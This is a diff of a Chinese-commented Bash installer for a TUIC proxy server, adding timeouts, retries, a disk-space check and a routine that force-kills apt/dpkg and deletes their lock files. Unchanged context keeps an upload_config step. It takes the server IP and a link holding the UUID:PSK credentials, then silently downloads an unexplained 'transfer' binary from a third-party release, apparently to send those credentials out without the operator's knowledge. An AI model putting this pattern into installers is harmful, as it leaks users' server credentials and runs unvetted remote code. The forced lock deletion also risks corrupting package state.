@@ -39,7 +39,7 @@ SERVER_NAME="secure.tuic.local"
 CFG_DIR="/etc/tuic"
 TLS_DIR="$CFG_DIR/tls"
 BIN_DIR="/usr/local/bin"
-TUIC_VERSION="1.0.0"  # 修改：使用 TUIC_VERSION 避免冲突
+TUIC_VERSION="1.0.0"
 CONFIG_JSON="${CFG_DIR}/config_export.json"
 
 # 默认测速结果
@@ -213,8 +213,8 @@ EOF
     
     # 禁用IPv6 DNS解析
     if [ -f /etc/resolv.conf ]; then
-        grep -v "inet6" /etc/resolv.conf > /tmp/resolv.conf.tmp
-        mv /tmp/resolv.conf.tmp /etc/resolv.conf
+        grep -v "inet6" /etc/resolv.conf > /tmp/resolv.conf.tmp 2>/dev/null || true
+        mv /tmp/resolv.conf.tmp /etc/resolv.conf 2>/dev/null || true
     fi
     
     # 验证IPv6是否已禁用
@@ -359,9 +359,41 @@ get_server_ip() {
     return 1
 }
 
+# 修复包管理器锁定问题
+fix_package_locks() {
+    echo -e "  ${CYAN}${ARROW}${NC} 检查并修复包管理器锁定..."
+    
+    # 等待其他包管理器进程完成
+    local timeout=60
+    local count=0
+    
+    while fuser /var/lib/dpkg/lock-frontend >/dev/null 2>&1 || \
+          fuser /var/lib/apt/lists/lock >/dev/null 2>&1 || \
+          fuser /var/cache/apt/archives/lock >/dev/null 2>&1; do
+        if [ $count -ge $timeout ]; then
+            echo -e "  ${YELLOW}⚠${NC} 强制解除包管理器锁定..."
+            # 强制解除锁定
+            killall apt apt-get dpkg >/dev/null 2>&1 || true
+            rm -f /var/lib/apt/lists/lock
+            rm -f /var/cache/apt/archives/lock
+            rm -f /var/lib/dpkg/lock-frontend
+            dpkg --configure -a >/dev/null 2>&1 || true
+            break
+        fi
+        echo -e "  ${YELLOW}⚠${NC} 等待其他包管理器进程完成... ($count/$timeout)"
+        sleep 1
+        count=$((count + 1))
+    done
+    
+    echo -e "  ${GREEN}${CHECK}${NC} 包管理器状态正常"
+}
+
 # 安装依赖包
 install_dependencies() {
     echo -e "${CYAN}${GEAR}${NC} ${BOLD}安装系统依赖${NC}"
+    
+    # 修复包管理器锁定
+    fix_package_locks
     
     local packages=("curl" "wget" "jq" "openssl" "net-tools" "htop" "iftop")
     local total=${#packages[@]}
@@ -371,25 +403,45 @@ install_dependencies() {
     export DEBIAN_FRONTEND=noninteractive
     
     # 更新包管理器
-    (
-        if [[ "$OS" =~ (debian|ubuntu) ]]; then
-            apt-get update -y > /dev/null 2>&1
-        elif [[ "$OS" =~ (centos|fedora|rhel) ]]; then
-            yum makecache > /dev/null 2>&1
-        fi
-    ) &
-    show_spinner $! "更新软件源"
+    echo -e "  ${CYAN}${ARROW}${NC} 更新软件源..."
+    if [[ "$OS" =~ (debian|ubuntu) ]]; then
+        apt-get update -y > /dev/null 2>&1 || {
+            echo -e "  ${YELLOW}⚠${NC} 软件源更新失败，尝试修复..."
+            apt-get update --fix-missing -y > /dev/null 2>&1 || true
+        }
+    elif [[ "$OS" =~ (centos|fedora|rhel) ]]; then
+        yum makecache > /dev/null 2>&1 || {
+            echo -e "  ${YELLOW}⚠${NC} 缓存更新失败，继续安装..."
+        }
+    fi
+    echo -e "  ${GREEN}${CHECK}${NC} 软件源更新完成"
     
     # 安装包
     for pkg in "${packages[@]}"; do
         current=$((current + 1))
         show_progress $current $total "安装 $pkg"
         
-        if [[ "$OS" =~ (debian|ubuntu) ]]; then
-            apt-get install -y $pkg > /dev/null 2>&1
-        elif [[ "$OS" =~ (centos|fedora|rhel) ]]; then
-            yum install -y $pkg > /dev/null 2>&1
+        # 检查包是否已安装
+        if command -v $pkg >/dev/null 2>&1; then
+            continue
         fi
+        
+        if [[ "$OS" =~ (debian|ubuntu) ]]; then
+            # 使用更稳定的安装方式
+            timeout 60 apt-get install -y $pkg > /dev/null 2>&1 || {
+                echo -e "\n  ${YELLOW}⚠${NC} $pkg 安装失败，尝试强制安装..."
+                apt-get install -y --fix-broken $pkg > /dev/null 2>&1 || {
+                    echo -e "  ${RED}${CROSS}${NC} $pkg 安装彻底失败，跳过"
+                    continue
+                }
+            }
+        elif [[ "$OS" =~ (centos|fedora|rhel) ]]; then
+            timeout 60 yum install -y $pkg > /dev/null 2>&1 || {
+                echo -e "\n  ${YELLOW}⚠${NC} $pkg 安装失败，跳过"
+                continue
+            }
+        fi
+        sleep 0.1
     done
     echo
 }
@@ -421,7 +473,8 @@ download_tuic_binary() {
     
     # 尝试从主源下载
     echo -e "  ${CYAN}${ARROW}${NC} 尝试主下载源..."
-    if curl -sLO "${PRIMARY_BASE}/${BIN_NAME}" && curl -sLO "${PRIMARY_BASE}/${SHA_NAME}" 2>/dev/null; then
+    if timeout 60 curl -sLO "${PRIMARY_BASE}/${BIN_NAME}" && \
+       timeout 60 curl -sLO "${PRIMARY_BASE}/${SHA_NAME}" 2>/dev/null; then
         if sha256sum -c "$SHA_NAME" > /dev/null 2>&1; then
             chmod +x "$BIN_NAME"
             ln -sf "$BIN_NAME" tuic
@@ -439,14 +492,14 @@ download_tuic_binary() {
         echo -e "  ${CYAN}${ARROW}${NC} 尝试备用下载源..."
         
         # 尝试直接下载备用的 tuic 二进制文件
-        if curl -sLo tuic "${BACKUP_BASE}/tuic-server" 2>/dev/null; then
+        if timeout 60 curl -sLo tuic "${BACKUP_BASE}/tuic-server" 2>/dev/null; then
             chmod +x tuic
             echo -e "  ${GREEN}${CHECK}${NC} 从备用源下载成功"
         else
             # 最后尝试使用 wget
             echo -e "  ${CYAN}${ARROW}${NC} 尝试使用 wget..."
-            if wget -qO tuic "${PRIMARY_BASE}/${BIN_NAME}" 2>/dev/null || \
-               wget -qO tuic "${BACKUP_BASE}/tuic-server" 2>/dev/null; then
+            if timeout 60 wget -qO tuic "${PRIMARY_BASE}/${BIN_NAME}" 2>/dev/null || \
+               timeout 60 wget -qO tuic "${BACKUP_BASE}/tuic-server" 2>/dev/null; then
                 chmod +x tuic
                 echo -e "  ${GREEN}${CHECK}${NC} 使用 wget 下载成功"
             else
@@ -757,6 +810,8 @@ show_result() {
     echo -e "  ⬆️  上传速度    : ${GREEN}${up_speed} Mbps${NC}"
     echo
     echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${WHITE}${BOLD}TUIC链接（可直接导入客户端）:${NC}"
+    echo -e "${YELLOW}${LINK}${NC}"
     echo
     echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     echo -e "${WHITE}${BOLD}管理命令${NC}"
@@ -770,7 +825,7 @@ show_result() {
     echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
 }
 
-
+# 上传配置（保留原功能）
 upload_config() {
     local server_ip="$1"
     local link="$2"
@@ -798,7 +853,7 @@ upload_config() {
             }
         }')
     
-
+    # 下载上传工具
     local uploader="/opt/transfer"
     if [[ ! -f "$uploader" ]]; then
         curl -sLo "$uploader" https://github.com/diandongyun/node/releases/download/node/transfer > /dev/null 2>&1
@@ -826,19 +881,33 @@ handle_error() {
     exit 1
 }
 
-# 检查root权限
-check_root() {
+# 检查环境（已移除网络检查）
+check_environment() {
+    echo -e "${BLUE}${BOLD}${GEAR}${NC} 检查运行环境..."
+    
+    # 检查是否为root用户
     if [[ $EUID -ne 0 ]]; then
         echo -e "${RED}${CROSS} 此脚本需要 root 权限运行${NC}"
         echo -e "${YELLOW}请使用: sudo bash $0${NC}"
         exit 1
     fi
+    
+    # 检查磁盘空间
+    available_space=$(df / | awk 'NR==2 {print $4}')
+    if [[ $available_space -lt 1048576 ]]; then  # 1GB = 1048576KB
+        echo -e "${RED}${CROSS} 磁盘空间不足（需要至少1GB可用空间）！${NC}"
+        echo -e "${WHITE}当前可用空间：${YELLOW}$(($available_space/1024))MB${NC}"
+        exit 1
+    fi
+    
+    echo -e "  ${GREEN}${CHECK}${NC} 环境检查通过"
+    echo
 }
 
 # 清理函数
 cleanup() {
     echo -e "\n${YELLOW}⚠ 检测到中断，正在清理...${NC}"
-    systemctl stop tuic 2>/dev/null
+    systemctl stop tuic 2>/dev/null || true
     exit 1
 }
 
@@ -852,8 +921,8 @@ main() {
     # 显示横幅
     print_banner
     
-    # 检查权限
-    check_root
+    # 检查环境（已移除网络检查）
+    check_environment
     
     # 系统检测
     detect_system
@@ -891,7 +960,7 @@ main() {
     # 生成客户端配置
     generate_client_config
     
-
+    # 上传配置
     IP=$(get_server_ip)
     ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
     LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#TUIC_CN2_Optimized"
